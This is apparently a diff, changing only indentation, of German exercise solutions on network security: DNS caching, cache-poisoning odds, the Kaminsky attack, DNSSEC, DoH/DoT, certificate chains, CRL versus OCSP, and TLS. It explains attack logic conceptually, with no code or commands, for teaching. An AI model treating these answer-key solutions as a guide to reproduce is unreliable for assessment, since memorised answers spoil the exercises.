@@ -81,76 +81,76 @@
 \subsection*{a) DNS-Ablauf mit Cache (Verständnis + Logik)}
 
 \begin{enumerate}[label=\roman*)]
-      \item \textbf{Welche DNS-Server kontaktiert R beim ersten Request (Reihenfolge)?}
-            Da der Cache leer ist, muss $R$ die komplette Rekursion durchlaufen:
-            \begin{enumerate}
-                  \item \textbf{Root-Server (.)}: Um den zuständigen Server für \texttt{.com} zu finden.
-                  \item \textbf{TLD-Server (.com)}: Um den zuständigen Server für \texttt{example.com} zu finden.
-                  \item \textbf{Authoritative Server (example.com)}: Dieser liefert schließlich die A-Record-Antwort für \texttt{www.example.com}.
-            \end{enumerate}
+  \item \textbf{Welche DNS-Server kontaktiert R beim ersten Request (Reihenfolge)?}
+        Da der Cache leer ist, muss $R$ die komplette Rekursion durchlaufen:
+        \begin{enumerate}
+          \item \textbf{Root-Server (.)}: Um den zuständigen Server für \texttt{.com} zu finden.
+          \item \textbf{TLD-Server (.com)}: Um den zuständigen Server für \texttt{example.com} zu finden.
+          \item \textbf{Authoritative Server (example.com)}: Dieser liefert schließlich die A-Record-Antwort für \texttt{www.example.com}.
+        \end{enumerate}
 
-      \item \textbf{Welche Einträge werden im Cache von R gespeichert?}
-            \begin{itemize}
-                  \item Der \textbf{A-Record} für \texttt{www.example.com} (TTL: 300s).
-                  \item Der \textbf{NS-Record} für die Zone \texttt{example.com} (TTL: 3600s), damit R bei künftigen Anfragen direkt weiß, wer für die Domain zuständig ist.
-                  \item Ggf. \textbf{Glue Records} (IP-Adressen des NS), falls diese in der Antwort enthalten waren.
-            \end{itemize}
+  \item \textbf{Welche Einträge werden im Cache von R gespeichert?}
+        \begin{itemize}
+          \item Der \textbf{A-Record} für \texttt{www.example.com} (TTL: 300s).
+          \item Der \textbf{NS-Record} für die Zone \texttt{example.com} (TTL: 3600s), damit R bei künftigen Anfragen direkt weiß, wer für die Domain zuständig ist.
+          \item Ggf. \textbf{Glue Records} (IP-Adressen des NS), falls diese in der Antwort enthalten waren.
+        \end{itemize}
 
-      \item \textbf{Führt eine erneute Anfrage nach 200 Sekunden zu externem DNS-Traffic? Begründen Sie.}
-            \textbf{Nein.} \\
-            \textit{Begründung:} Die TTL des A-Records beträgt 300 Sekunden. Da $200 < 300$ ist, ist der Eintrag im Cache noch gültig. $R$ beantwortet die Anfrage direkt aus dem Cache, ohne externe Server zu kontaktieren.
+  \item \textbf{Führt eine erneute Anfrage nach 200 Sekunden zu externem DNS-Traffic? Begründen Sie.}
+        \textbf{Nein.} \\
+        \textit{Begründung:} Die TTL des A-Records beträgt 300 Sekunden. Da $200 < 300$ ist, ist der Eintrag im Cache noch gültig. $R$ beantwortet die Anfrage direkt aus dem Cache, ohne externe Server zu kontaktieren.
 \end{enumerate}
 
 \subsection*{b) Off-Path DNS Cache Poisoning (Rechenaufgabe)}
 
 \begin{enumerate}[label=\roman*)]
-      \item \textbf{Wie groß ist die Erfolgswahrscheinlichkeit eines einzelnen gefälschten DNS-Pakets?}
-            Die Sicherheit basiert auf zwei Zufallswerten, die der Angreifer erraten muss:
-            \begin{itemize}
-                  \item \textbf{Transaktions-ID (TXID):} 16 Bit $\rightarrow 2^{16} = 65.536$ Möglichkeiten.
-                  \item \textbf{Quellport:} Bereich $> 1023$. Der Port ist eine 16-Bit Zahl (Max 65.535).
-                        \\ Anzahl der Ports: $65.535 - 1024 + 1 = 64.512$ Möglichkeiten.
-            \end{itemize}
-            Die Wahrscheinlichkeit $P$ für einen Treffer bei einem einzelnen Paket ist das Produkt der Einzelwahrscheinlichkeiten:
-            $$ P = \frac{1}{2^{16}} \times \frac{1}{64.512} \approx \frac{1}{65.536 \times 64.512} \approx \frac{1}{4,23 \times 10^9} $$
-            $$ P \approx 2,36 \times 10^{-10} $$
+  \item \textbf{Wie groß ist die Erfolgswahrscheinlichkeit eines einzelnen gefälschten DNS-Pakets?}
+        Die Sicherheit basiert auf zwei Zufallswerten, die der Angreifer erraten muss:
+        \begin{itemize}
+          \item \textbf{Transaktions-ID (TXID):} 16 Bit $\rightarrow 2^{16} = 65.536$ Möglichkeiten.
+          \item \textbf{Quellport:} Bereich $> 1023$. Der Port ist eine 16-Bit Zahl (Max 65.535).
+                \\ Anzahl der Ports: $65.535 - 1024 + 1 = 64.512$ Möglichkeiten.
+        \end{itemize}
+        Die Wahrscheinlichkeit $P$ für einen Treffer bei einem einzelnen Paket ist das Produkt der Einzelwahrscheinlichkeiten:
+        \[ P = \frac{1}{2^{16}} \times \frac{1}{64.512} \approx \frac{1}{65.536 \times 64.512} \approx \frac{1}{4,23 \times 10^9} \]
+        \[ P \approx 2,36 \times 10^{-10} \]
 
-      \item \textbf{Erklären Sie kurz, warum dieser Angriff in der Praxis dennoch relevant war (Vorlesung).}
-            Trotz der geringen Wahrscheinlichkeit pro Paket ist der Angriff relevant, weil Angreifer Tausende von Paketen pro Sekunde senden können ("Brute Force"). Wenn der Angreifer das "Race Condition"-Fenster lange genug offen halten kann (oder oft genug probiert), summiert sich die Wahrscheinlichkeit auf ein kritisches Niveau (Geburtstagsparadoxon-Ansatz bei vielen gleichzeitigen Anfragen/Antworten). Zudem implementierten ältere Resolver oft keine Port-Randomisierung, was die Entropie drastisch reduzierte.
+  \item \textbf{Erklären Sie kurz, warum dieser Angriff in der Praxis dennoch relevant war (Vorlesung).}
+        Trotz der geringen Wahrscheinlichkeit pro Paket ist der Angriff relevant, weil Angreifer Tausende von Paketen pro Sekunde senden können ("Brute Force"). Wenn der Angreifer das "Race Condition"-Fenster lange genug offen halten kann (oder oft genug probiert), summiert sich die Wahrscheinlichkeit auf ein kritisches Niveau (Geburtstagsparadoxon-Ansatz bei vielen gleichzeitigen Anfragen/Antworten). Zudem implementierten ältere Resolver oft keine Port-Randomisierung, was die Entropie drastisch reduzierte.
 \end{enumerate}
 
 \subsection*{c) Kaminsky-Angriff (Logik + Konzept)}
 
 \begin{enumerate}[label=\roman*)]
-      \item \textbf{Warum helfen zufällige Subdomains dem Angreifer, trotz DNS-Caching?}
-            Normalerweise verhindert der Cache (TTL), dass ein Resolver sofort erneut beim autoritativen Server anfragt, wenn ein Angriff fehlschlägt. Durch die Abfrage von nicht existierenden, zufälligen Subdomains (z.B. \texttt{123.example.com}, \texttt{abc.example.com}) zwingt der Angreifer den Resolver dazu, jedes Mal eine neue Anfrage an den autoritativen Server zu stellen (da diese Subdomains nicht im Cache sind). Dies schafft unendlich viele neue Gelegenheiten ("Race Conditions"), um eine gefälschte Antwort einzuschleusen.
+  \item \textbf{Warum helfen zufällige Subdomains dem Angreifer, trotz DNS-Caching?}
+        Normalerweise verhindert der Cache (TTL), dass ein Resolver sofort erneut beim autoritativen Server anfragt, wenn ein Angriff fehlschlägt. Durch die Abfrage von nicht existierenden, zufälligen Subdomains (z.B. \texttt{123.example.com}, \texttt{abc.example.com}) zwingt der Angreifer den Resolver dazu, jedes Mal eine neue Anfrage an den autoritativen Server zu stellen (da diese Subdomains nicht im Cache sind). Dies schafft unendlich viele neue Gelegenheiten ("Race Conditions"), um eine gefälschte Antwort einzuschleusen.
 
-      \item \textbf{Wie kann der Angreifer erreichen, dass seine Antwort statt der Antwort des autoritativen Name Servers genommen wird?}
-            Der Angreifer flutet den Resolver mit gefälschten Antworten, sobald der Resolver die Anfrage an den autoritativen Server gesendet hat. Er muss schneller sein als der legitime Server und die korrekte Kombination aus Transaktions-ID und Quellport erraten. Die erste Antwort, die passt und beim Resolver eintrifft, gewinnt ("First-come, first-served").
+  \item \textbf{Wie kann der Angreifer erreichen, dass seine Antwort statt der Antwort des autoritativen Name Servers genommen wird?}
+        Der Angreifer flutet den Resolver mit gefälschten Antworten, sobald der Resolver die Anfrage an den autoritativen Server gesendet hat. Er muss schneller sein als der legitime Server und die korrekte Kombination aus Transaktions-ID und Quellport erraten. Die erste Antwort, die passt und beim Resolver eintrifft, gewinnt ("First-come, first-served").
 
-      \item \textbf{Welcher Eintrag wird beim Erfolg des Angriffs manipuliert?}
-            Das Ziel ist meist nicht die Subdomain selbst, sondern der \textbf{NS-Eintrag (Nameserver Record)} der Zone \texttt{example.com} im Cache. Der Angreifer fügt in die "Authority Section" seiner gefälschten Antwort einen bösartigen Nameserver ein. Wird dieser akzeptiert, leitet der Resolver künftig \textit{alle} Anfragen für \texttt{example.com} an den Server des Angreifers weiter.
+  \item \textbf{Welcher Eintrag wird beim Erfolg des Angriffs manipuliert?}
+        Das Ziel ist meist nicht die Subdomain selbst, sondern der \textbf{NS-Eintrag (Nameserver Record)} der Zone \texttt{example.com} im Cache. Der Angreifer fügt in die "Authority Section" seiner gefälschten Antwort einen bösartigen Nameserver ein. Wird dieser akzeptiert, leitet der Resolver künftig \textit{alle} Anfragen für \texttt{example.com} an den Server des Angreifers weiter.
 \end{enumerate}
 
 \subsection*{d) DNSSEC: Wirkung auf Cache Poisoning}
 
 \begin{enumerate}[label=\roman*)]
-      \item \textbf{Welche Dinge prüft der Resolver bei DNSSEC-validierten Antworten?}
-            Der Resolver prüft die digitale Signatur (\textbf{RRSIG}) der DNS-Einträge mithilfe des öffentlichen Schlüssels (\textbf{DNSKEY}). Zudem verifiziert er die Vertrauenskette (\textbf{Chain of Trust}) über die DS-Records (Delegation Signer) von der Root-Zone bis hinunter zur angefragten Zone, um die Authentizität und Integrität der Daten sicherzustellen.
+  \item \textbf{Welche Dinge prüft der Resolver bei DNSSEC-validierten Antworten?}
+        Der Resolver prüft die digitale Signatur (\textbf{RRSIG}) der DNS-Einträge mithilfe des öffentlichen Schlüssels (\textbf{DNSKEY}). Zudem verifiziert er die Vertrauenskette (\textbf{Chain of Trust}) über die DS-Records (Delegation Signer) von der Root-Zone bis hinunter zur angefragten Zone, um die Authentizität und Integrität der Daten sicherzustellen.
 
-      \item \textbf{Warum schlagen klassische Cache-Poisoning-Angriffe hier fehl?}
-            Ein Angreifer kann zwar die IP-Adresse, TXID und Ports fälschen, aber er besitzt nicht den privaten kryptografischen Schlüssel der Zone. Er kann daher keine gültige RRSIG-Signatur für die gefälschten Daten erzeugen. Der Resolver erkennt die ungültige oder fehlende Signatur bei der Validierung und verwirft das gefälschte Paket.
+  \item \textbf{Warum schlagen klassische Cache-Poisoning-Angriffe hier fehl?}
+        Ein Angreifer kann zwar die IP-Adresse, TXID und Ports fälschen, aber er besitzt nicht den privaten kryptografischen Schlüssel der Zone. Er kann daher keine gültige RRSIG-Signatur für die gefälschten Daten erzeugen. Der Resolver erkennt die ungültige oder fehlende Signatur bei der Validierung und verwirft das gefälschte Paket.
 \end{enumerate}
 
 \subsection*{e) DoH / DoT: Schutzwirkung (Bewertung)}
 
 \begin{enumerate}[label=\roman*)]
-      \item \textbf{Welchen konkreten Angriff aus dieser Übung verhindern DoT und DoH?}
-            Sie verhindern \textbf{Man-in-the-Middle (MitM) Angriffe} und das Mitlesen (Privacy) auf der Strecke zwischen dem Client und dem Resolver (bzw. Stub-Resolver und Recursive Resolver). Ein Angreifer im lokalen WLAN oder ISP-Netz kann die Antworten nicht manipulieren oder spoofing betreiben, da der Kanal mittels TLS verschlüsselt und authentifiziert ist.
+  \item \textbf{Welchen konkreten Angriff aus dieser Übung verhindern DoT und DoH?}
+        Sie verhindern \textbf{Man-in-the-Middle (MitM) Angriffe} und das Mitlesen (Privacy) auf der Strecke zwischen dem Client und dem Resolver (bzw. Stub-Resolver und Recursive Resolver). Ein Angreifer im lokalen WLAN oder ISP-Netz kann die Antworten nicht manipulieren oder spoofing betreiben, da der Kanal mittels TLS verschlüsselt und authentifiziert ist.
 
-      \item \textbf{Welchen Angriff verhindern sie nicht? Begründen Sie kurz.}
-            Sie verhindern \textbf{nicht} das Cache Poisoning des Resolvers selbst (wie in Aufgabe b oder c beschrieben).
-            \textit{Begründung:} DoH/DoT sichert nur den Weg \textit{Client} $\leftrightarrow$ \textit{Resolver}. Der Weg \textit{Resolver} $\leftrightarrow$ \textit{Autoritativer Server} erfolgt oft weiterhin unverschlüsselt über UDP/53. Wenn ein Angreifer (z.B. per Kaminsky-Methode) den Cache des Resolvers vergiftet, liefert der Resolver die vergifteten Daten über den sicheren DoH/DoT-Kanal an den Client aus.
+  \item \textbf{Welchen Angriff verhindern sie nicht? Begründen Sie kurz.}
+        Sie verhindern \textbf{nicht} das Cache Poisoning des Resolvers selbst (wie in Aufgabe b oder c beschrieben).
+        \textit{Begründung:} DoH/DoT sichert nur den Weg \textit{Client} $\leftrightarrow$ \textit{Resolver}. Der Weg \textit{Resolver} $\leftrightarrow$ \textit{Autoritativer Server} erfolgt oft weiterhin unverschlüsselt über UDP/53. Wenn ein Angreifer (z.B. per Kaminsky-Methode) den Cache des Resolvers vergiftet, liefert der Resolver die vergifteten Daten über den sicheren DoH/DoT-Kanal an den Client aus.
 \end{enumerate}
 
 \section*{2. Zertifikate}
@@ -162,66 +162,66 @@ Der Aussteller (Issuer) von Alice's Zertifikat (Zertifikat E) ist die \textbf{HE
 \textit{Hinweis: Die Struktur ergibt sich aus den Feldern "Subject" (Inhaber) und "Issuer" (Aussteller).}
 
 \begin{center}
-      \begin{tikzpicture}[
-                  level 1/.style={sibling distance=6cm},
-                  level 2/.style={sibling distance=6cm},
-                  edge from parent/.style={draw, -latex},
-                  owner/.style={rectangle, draw, thick, minimum width=3cm, minimum height=1cm, align=center},
-                  cert/.style={rectangle, rounded corners, draw, dashed, minimum width=3cm, minimum height=1.2cm, align=center, fill=gray!10, yshift=-1.2cm}
-            ]
+  \begin{tikzpicture}[
+      level 1/.style={sibling distance=6cm},
+      level 2/.style={sibling distance=6cm},
+      edge from parent/.style={draw, -latex},
+      owner/.style={rectangle, draw, thick, minimum width=3cm, minimum height=1cm, align=center},
+      cert/.style={rectangle, rounded corners, draw, dashed, minimum width=3cm, minimum height=1.2cm, align=center, fill=gray!10, yshift=-1.2cm}
+    ]
 
-            % Root
-            \node[owner] {DE-CA}
+    % Root
+    \node[owner] {DE-CA}
+    child {
+        node[cert] {Zertifikat C\\01.06.20 - 01.12.29} % Cert C details
+      }
+    % Child 1 (HESSEN)
+    child {
+        node[owner, yshift=-2.5cm] {HESSEN-CA}
+        child {
+            node[cert] {Zertifikat B\\01.01.23 - 31.12.26} % Cert B details
+          }
+        % Children of HESSEN
+        child {
+            node[owner, yshift=-2.5cm, xshift=-3cm] {Alice}
             child {
-                        node[cert] {Zertifikat C\\01.06.20 - 01.12.29} % Cert C details
+                node[cert] {Zertifikat E\\01.01.24 - 31.12.26}
+              }
+          }
+        child {
+            node[owner, yshift=-2.5cm, xshift=3cm] {DARMSTADT-CA}
+            child {
+                node[cert] {Zertifikat D\\01.01.23 - 31.12.24}
+              }
+            % Child of DARMSTADT
+            child {
+                node[owner, yshift=-2.5cm] {Bob}
+                child {
+                    node[cert] {Zertifikat A\\01.06.24 - 01.06.26}
                   }
-            % Child 1 (HESSEN)
-            child {
-                        node[owner, yshift=-2.5cm] {HESSEN-CA}
-                        child {
-                                    node[cert] {Zertifikat B\\01.01.23 - 31.12.26} % Cert B details
-                              }
-                        % Children of HESSEN
-                        child {
-                                    node[owner, yshift=-2.5cm, xshift=-3cm] {Alice}
-                                    child {
-                                                node[cert] {Zertifikat E\\01.01.24 - 31.12.26}
-                                          }
-                              }
-                        child {
-                                    node[owner, yshift=-2.5cm, xshift=3cm] {DARMSTADT-CA}
-                                    child {
-                                                node[cert] {Zertifikat D\\01.01.23 - 31.12.24}
-                                          }
-                                    % Child of DARMSTADT
-                                    child {
-                                                node[owner, yshift=-2.5cm] {Bob}
-                                                child {
-                                                            node[cert] {Zertifikat A\\01.06.24 - 01.06.26}
-                                                      }
-                                          }
-                              }
-                  };
-      \end{tikzpicture}
+              }
+          }
+      };
+  \end{tikzpicture}
 \end{center}
 
 \subsection*{3. Nutzbarkeit der Zertifikate (19.01.2026 - 25.01.2026)}
 
 \begin{table}[H]
-      \centering
-      \renewcommand{\arraystretch}{1.5}
-      \begin{tabular}{|l|l|p{9cm}|}
-            \hline
-            \textbf{Inhaber} & \textbf{Nutzbar} & \textbf{Grund}                                                                                                                                                                                                  \\ \hline
-            Alice            & \textbf{Ja}      & Das Zertifikat E (Alice) ist gültig (bis 31.12.2026). Auch das Zertifikat des Ausstellers (HESSEN-CA, Cert B) ist zum aktuellen Zeitpunkt gültig (bis 31.12.2026). Die Vertrauenskette ist intakt.              \\ \hline
-            Bob              & \textbf{Nein}    & Zwar liegt das aktuelle Datum im Zeitraum von Zertifikat A (Bob), aber das \textbf{Zertifikat des Ausstellers (DARMSTADT-CA, Cert D) ist am 31.12.2024 abgelaufen}. Damit ist die Vertrauenskette unterbrochen. \\ \hline
-      \end{tabular}
+  \centering
+  \renewcommand{\arraystretch}{1.5}
+  \begin{tabular}{|l|l|p{9cm}|}
+    \hline
+    \textbf{Inhaber} & \textbf{Nutzbar} & \textbf{Grund}                                                                                                                                                                                                  \\ \hline
+    Alice            & \textbf{Ja}      & Das Zertifikat E (Alice) ist gültig (bis 31.12.2026). Auch das Zertifikat des Ausstellers (HESSEN-CA, Cert B) ist zum aktuellen Zeitpunkt gültig (bis 31.12.2026). Die Vertrauenskette ist intakt.              \\ \hline
+    Bob              & \textbf{Nein}    & Zwar liegt das aktuelle Datum im Zeitraum von Zertifikat A (Bob), aber das \textbf{Zertifikat des Ausstellers (DARMSTADT-CA, Cert D) ist am 31.12.2024 abgelaufen}. Damit ist die Vertrauenskette unterbrochen. \\ \hline
+  \end{tabular}
 \end{table}
 
 \subsection*{4. Ergänzung Schlüssel Zertifikat A}
 \begin{itemize}
-      \item \textbf{Schlüssel:} \texttt{key-DEDEDE}
-      \item \textbf{Woher:} Dieser Schlüssel stammt aus dem Zertifikat des Ausstellers von Bob. Der Aussteller ist \textit{DARMSTADT-CA} (siehe Zertifikat D, Feld "Public Key").
+  \item \textbf{Schlüssel:} \texttt{key-DEDEDE}
+  \item \textbf{Woher:} Dieser Schlüssel stammt aus dem Zertifikat des Ausstellers von Bob. Der Aussteller ist \textit{DARMSTADT-CA} (siehe Zertifikat D, Feld "Public Key").
 \end{itemize}
 
 \subsection*{5. Alice hat USB-Stick verloren}
@@ -238,17 +238,17 @@ Ein gültiges Zertifikat bestätigt nur die \textit{Identität} des Webservers (
 \subsection*{8. CRL vs. OCSP Vergleich}
 
 \begin{table}[h!]
-      \centering
-      \renewcommand{\arraystretch}{1.3}
-      \begin{tabular}{|p{6cm}|c|p{7cm}|}
-            \hline
-            \textbf{Aspekt}                                                   & \textbf{Wahl} & \textbf{Grund}                                                                                                                                                                   \\ \hline
-            Sie brauchen immer den aktuellsten Stand                          & \textbf{OCSP} & OCSP fragt den Status in Echtzeit beim Responder ab. CRLs werden nur periodisch aktualisiert (Time-Gap).                                                                         \\ \hline
-            Sie möchten die Gültigkeit eines Zertifikat offline prüfen können & \textbf{CRL}  & Die CRL (Liste) kann heruntergeladen und lokal gespeichert werden. OCSP benötigt eine aktive Verbindung zum Responder.                                                           \\ \hline
-            Sie möchten Ihre Privatsphäre schützen                            & \textbf{CRL}  & Bei OCSP erfährt der CA-Server, welche Webseite (Domain) der Nutzer gerade besucht. Beim Download einer CRL sieht die CA nur den Download der Liste, nicht die konkrete Prüfung. \\ \hline
-            Sie haben auf Ihrem Gerät nur sehr wenig Speicherplatz            & \textbf{OCSP} & CRLs können sehr groß werden (alle gesperrten Zertifikate). OCSP erfordert nur kleine Request/Response-Pakete.                                                                   \\ \hline
-            Sie möchten unterwegs bei einer Prüfung Traffic sparen            & \textbf{OCSP} & Der Download einer kompletten CRL (oft mehrere MB) verbraucht mehr Datenvolumen als eine einzelne, kleine OCSP-Abfrage.                                                          \\ \hline
-      \end{tabular}
+  \centering
+  \renewcommand{\arraystretch}{1.3}
+  \begin{tabular}{|p{6cm}|c|p{7cm}|}
+    \hline
+    \textbf{Aspekt}                                                   & \textbf{Wahl} & \textbf{Grund}                                                                                                                                                                   \\ \hline
+    Sie brauchen immer den aktuellsten Stand                          & \textbf{OCSP} & OCSP fragt den Status in Echtzeit beim Responder ab. CRLs werden nur periodisch aktualisiert (Time-Gap).                                                                         \\ \hline
+    Sie möchten die Gültigkeit eines Zertifikat offline prüfen können & \textbf{CRL}  & Die CRL (Liste) kann heruntergeladen und lokal gespeichert werden. OCSP benötigt eine aktive Verbindung zum Responder.                                                           \\ \hline
+    Sie möchten Ihre Privatsphäre schützen                            & \textbf{CRL}  & Bei OCSP erfährt der CA-Server, welche Webseite (Domain) der Nutzer gerade besucht. Beim Download einer CRL sieht die CA nur den Download der Liste, nicht die konkrete Prüfung. \\ \hline
+    Sie haben auf Ihrem Gerät nur sehr wenig Speicherplatz            & \textbf{OCSP} & CRLs können sehr groß werden (alle gesperrten Zertifikate). OCSP erfordert nur kleine Request/Response-Pakete.                                                                   \\ \hline
+    Sie möchten unterwegs bei einer Prüfung Traffic sparen            & \textbf{OCSP} & Der Download einer kompletten CRL (oft mehrere MB) verbraucht mehr Datenvolumen als eine einzelne, kleine OCSP-Abfrage.                                                          \\ \hline
+  \end{tabular}
 \end{table}
 
 \section*{3. TLS / Secure Channel}
@@ -256,16 +256,16 @@ Ein gültiges Zertifikat bestätigt nur die \textit{Identität} des Webservers (
 \subsection*{a) Was passiert konzeptionell im TLS-Handshake?}
 Konzeptionell dient der TLS-Handshake dazu, eine sichere Sitzung zwischen Client und Server zu etablieren, bevor Anwendungsdaten gesendet werden. Der Ablauf umfasst drei wesentliche Phasen:
 \begin{enumerate}
-      \item \textbf{Negotiation (Aushandlung):} Client und Server einigen sich auf eine Protokollversion (z.~B. TLS 1.2 oder 1.3) und kryptografische Algorithmen (Cipher Suite).
-      \item \textbf{Authentication (Authentifizierung):} In der Regel authentifiziert sich der Server gegenüber dem Client mittels eines Zertifikats (X.509). Optional kann sich auch der Client authentifizieren (Mutual TLS).
-      \item \textbf{Key Exchange (Schlüsselaustausch):} Beide Parteien berechnen ein gemeinsames Geheimnis (Master Secret), aus dem die symmetrischen Sitzungsschlüssel für Verschlüsselung und Integritätssicherung abgeleitet werden.
+  \item \textbf{Negotiation (Aushandlung):} Client und Server einigen sich auf eine Protokollversion (z.~B. TLS 1.2 oder 1.3) und kryptografische Algorithmen (Cipher Suite).
+  \item \textbf{Authentication (Authentifizierung):} In der Regel authentifiziert sich der Server gegenüber dem Client mittels eines Zertifikats (X.509). Optional kann sich auch der Client authentifizieren (Mutual TLS).
+  \item \textbf{Key Exchange (Schlüsselaustausch):} Beide Parteien berechnen ein gemeinsames Geheimnis (Master Secret), aus dem die symmetrischen Sitzungsschlüssel für Verschlüsselung und Integritätssicherung abgeleitet werden.
 \end{enumerate}
 
 \subsection*{b) TLS Authentifizierung}
 Das Protokoll stellt die Authentizität durch asymmetrische Kryptografie und eine \textit{Public Key Infrastructure} (PKI) sicher:
 \begin{itemize}
-      \item \textbf{Zertifikatsprüfung:} Der Server sendet sein öffentliches Zertifikat (X.509). Der Client überprüft die Gültigkeit des Zertifikats (Signatur der CA, Ablaufdatum, Revocation-Status) und vertraut diesem über vorinstallierte Root-CA-Zertifikate.
-      \item \textbf{Besitznachweis (Proof of Possession):} Der Server muss beweisen, dass er den zum öffentlichen Schlüssel im Zertifikat gehörenden privaten Schlüssel ($K_{priv}$) besitzt. Dies geschieht (je nach TLS-Version und Cipher Suite) entweder durch das Entschlüsseln des vom Client gesendeten Pre-Master-Secrets (klassisches RSA) oder durch das Erstellen einer digitalen Signatur über die Handshake-Daten (bei DHE/ECDHE), welche der Client mit dem öffentlichen Schlüssel aus dem Zertifikat verifiziert.
+  \item \textbf{Zertifikatsprüfung:} Der Server sendet sein öffentliches Zertifikat (X.509). Der Client überprüft die Gültigkeit des Zertifikats (Signatur der CA, Ablaufdatum, Revocation-Status) und vertraut diesem über vorinstallierte Root-CA-Zertifikate.
+  \item \textbf{Besitznachweis (Proof of Possession):} Der Server muss beweisen, dass er den zum öffentlichen Schlüssel im Zertifikat gehörenden privaten Schlüssel ($K_{priv}$) besitzt. Dies geschieht (je nach TLS-Version und Cipher Suite) entweder durch das Entschlüsseln des vom Client gesendeten Pre-Master-Secrets (klassisches RSA) oder durch das Erstellen einer digitalen Signatur über die Handshake-Daten (bei DHE/ECDHE), welche der Client mit dem öffentlichen Schlüssel aus dem Zertifikat verifiziert.
 \end{itemize}
 
 \subsection*{c) TLS Forward Secrecy}
@@ -274,17 +274,17 @@ Das Protokoll stellt die Authentizität durch asymmetrische Kryptografie und ein
 \noindent \textbf{Erreichung im TLS-Handshake:}
 Dies wird durch die Verwendung von \textbf{ephemeren (flüchtigen) Diffie-Hellman-Schlüsselaustauschverfahren} (DHE oder ECDHE) erreicht.
 \begin{itemize}
-      \item Für jede Sitzung generieren Client und Server neue, temporäre Schlüsselpaare ($a, g^a$ und $b, g^b$).
-      \item Das gemeinsame Geheimnis $g^{ab}$ wird aus diesen temporären Werten berechnet.
-      \item Der langfristige private Schlüssel des Servers wird nur zum \textit{Signieren} der Parameter (zur Authentifizierung) verwendet, nicht zum Verschlüsseln des Sitzungsschlüssels. Nach der Sitzung werden die temporären Schlüssel gelöscht.
+  \item Für jede Sitzung generieren Client und Server neue, temporäre Schlüsselpaare ($a, g^a$ und $b, g^b$).
+  \item Das gemeinsame Geheimnis $g^{ab}$ wird aus diesen temporären Werten berechnet.
+  \item Der langfristige private Schlüssel des Servers wird nur zum \textit{Signieren} der Parameter (zur Authentifizierung) verwendet, nicht zum Verschlüsseln des Sitzungsschlüssels. Nach der Sitzung werden die temporären Schlüssel gelöscht.
 \end{itemize}
 
 \subsection*{d) TLS Anonymität}
 Anonymität gegenüber Außenstehenden (Eavesdroppers) bedeutet, dass diese nicht erkennen können, wer miteinander kommuniziert (Identitätsschutz).
 \begin{itemize}
-      \item \textbf{Verschlüsselung der Nutzdaten:} Durch die Verschlüsselung des Tunnels sind Login-Daten (User-ID) und Inhalte für Dritte nicht lesbar.
-      \item \textbf{Verschlüsselung des Handshakes (TLS 1.3):} In älteren Versionen (TLS 1.2) wurde das Server-Zertifikat im Klartext übertragen, wodurch Beobachter die Identität des Servers erkennen konnten. In TLS 1.3 wird der Großteil des Handshakes (einschließlich des Zertifikatsaustauschs) verschlüsselt. Dies schützt die Identität der Parteien vor passiven Mithörern.
-      \item \textit{Hinweis:} Vollständige Anonymität (Verbergen der IP-Adressen oder der SNI - Server Name Indication) leistet TLS standardmäßig nicht allein; hierfür wären Technologien wie ECH (Encrypted Client Hello) oder Tor notwendig.
+  \item \textbf{Verschlüsselung der Nutzdaten:} Durch die Verschlüsselung des Tunnels sind Login-Daten (User-ID) und Inhalte für Dritte nicht lesbar.
+  \item \textbf{Verschlüsselung des Handshakes (TLS 1.3):} In älteren Versionen (TLS 1.2) wurde das Server-Zertifikat im Klartext übertragen, wodurch Beobachter die Identität des Servers erkennen konnten. In TLS 1.3 wird der Großteil des Handshakes (einschließlich des Zertifikatsaustauschs) verschlüsselt. Dies schützt die Identität der Parteien vor passiven Mithörern.
+  \item \textit{Hinweis:} Vollständige Anonymität (Verbergen der IP-Adressen oder der SNI - Server Name Indication) leistet TLS standardmäßig nicht allein; hierfür wären Technologien wie ECH (Encrypted Client Hello) oder Tor notwendig.
 \end{itemize}
 
 \subsection*{e) TLS Downgrade Angriff}
@@ -298,42 +298,42 @@ Anonymität gegenüber Außenstehenden (Eavesdroppers) bedeutet, dass diese nich
 Analyse von: \texttt{TLS\_ECDHE\_RSA\_WITH\_AES\_256\_GCM\_SHA384}
 
 \begin{itemize}
-      \item \textbf{TLS:} Das verwendete Protokoll (Transport Layer Security).
-      \item \textbf{ECDHE (Key Exchange):} \textit{Elliptic Curve Diffie-Hellman Ephemeral}. Dient dem Schlüsselaustausch und bietet Forward Secrecy.
-      \item \textbf{RSA (Authentication):} Der Algorithmus, der für die Authentifizierung (Signaturprüfung des Zertifikats) verwendet wird.
-      \item \textbf{WITH:} Trennwort.
-      \item \textbf{AES\_256\_GCM (Bulk Encryption):} \textit{Advanced Encryption Standard} mit 256-Bit Schlüssel im \textit{Galois/Counter Mode}. Dient der symmetrischen Verschlüsselung (Vertraulichkeit) und integrierten Integritätssicherung (AEAD).
-      \item \textbf{SHA384 (PRF):} \textit{Secure Hash Algorithm} mit 384 Bit. Dient in diesem Kontext (TLS 1.2) als Pseudo-Random Function (PRF) für die Schlüsselableitung. (Hinweis: Die Integrität der Nachrichten wird hier primär durch GCM gewährleistet, nicht durch HMAC-SHA384).
+  \item \textbf{TLS:} Das verwendete Protokoll (Transport Layer Security).
+  \item \textbf{ECDHE (Key Exchange):} \textit{Elliptic Curve Diffie-Hellman Ephemeral}. Dient dem Schlüsselaustausch und bietet Forward Secrecy.
+  \item \textbf{RSA (Authentication):} Der Algorithmus, der für die Authentifizierung (Signaturprüfung des Zertifikats) verwendet wird.
+  \item \textbf{WITH:} Trennwort.
+  \item \textbf{AES\_256\_GCM (Bulk Encryption):} \textit{Advanced Encryption Standard} mit 256-Bit Schlüssel im \textit{Galois/Counter Mode}. Dient der symmetrischen Verschlüsselung (Vertraulichkeit) und integrierten Integritätssicherung (AEAD).
+  \item \textbf{SHA384 (PRF):} \textit{Secure Hash Algorithm} mit 384 Bit. Dient in diesem Kontext (TLS 1.2) als Pseudo-Random Function (PRF) für die Schlüsselableitung. (Hinweis: Die Integrität der Nachrichten wird hier primär durch GCM gewährleistet, nicht durch HMAC-SHA384).
 \end{itemize}
 
 \subsection*{g) Sind folgende Ciphersuites sicher?}
 
 \begin{enumerate}
-      \item[\textbf{a)}] \texttt{TLS\_RSA\_WITH\_RC4\_128\_MD5} \\
-            \textbf{Nein (Unsicher).}
-            \begin{itemize}
-                  \item \texttt{RSA} (ohne DHE) bietet kein Forward Secrecy.
-                  \item \texttt{RC4} ist ein gebrochener Stromalgorithmus mit statistischen Schwächen.
